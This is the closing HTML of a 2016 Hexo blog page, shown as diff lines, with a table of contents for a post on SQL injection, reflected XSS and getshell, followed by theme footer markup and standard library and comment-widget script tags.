+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#后台SQL注入"><span class="nav-number">1.</span> <span class="nav-text">后台SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反射型xss"><span class="nav-number">2.</span> <span class="nav-text">反射型xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后台getshell"><span class="nav-number">3.</span> <span class="nav-text">后台getshell</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wps2015</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"wps2015"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
